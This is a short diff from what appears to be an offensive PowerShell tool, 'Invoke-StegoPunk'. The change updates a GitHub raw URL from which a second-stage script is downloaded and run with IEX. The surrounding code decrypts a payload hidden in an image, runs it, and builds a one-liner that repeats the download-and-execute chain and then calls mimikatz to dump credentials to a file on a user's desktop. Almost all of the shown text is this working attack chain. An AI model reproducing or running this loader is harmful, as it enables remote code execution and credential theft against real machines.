@@ -95,7 +95,7 @@ function Invoke-StegoPunk {
                 $proxy = New-Object System.Net.webproxy
                 $stage2.proxy = $proxy
                 $stage2.usedefaultcredentials = "true"
-                IEX $stage2.Downloadstring('https://raw.githubusercontent.com/Tru5tNo1/Cyberwar/master/Invoke-AES2Stage.ps1')
+                IEX $stage2.Downloadstring('https://raw.githubusercontent.com/Tru5tNo1/StegoPunk/master/Invoke-AES2Stage.ps1')
                 $base2 = Invoke-AES2Stage -key $key -imageurl $imageurl
                 iex ($base2)
                 $cmd = '$stage2 = New-Object System.Net.WebCLient;$proxy = New-Object System.Net.webproxy; $stage2.proxy = $proxy; $stage2.usedefaultcredentials = "true"; IEx $stage2.Downloadstring("https://raw.githubusercontent.com/Tru5tNo1/StegoPunk/master/Invoke-AES1Stage.ps1");$base1 = Invoke-AES1Stage -key ' + $key + '-imageurl ' + $imageurl + '; iex ($base1); invoke-mimikatz -dumpcreds > c:\users\v.delaurentis\desktop\vito.txt'
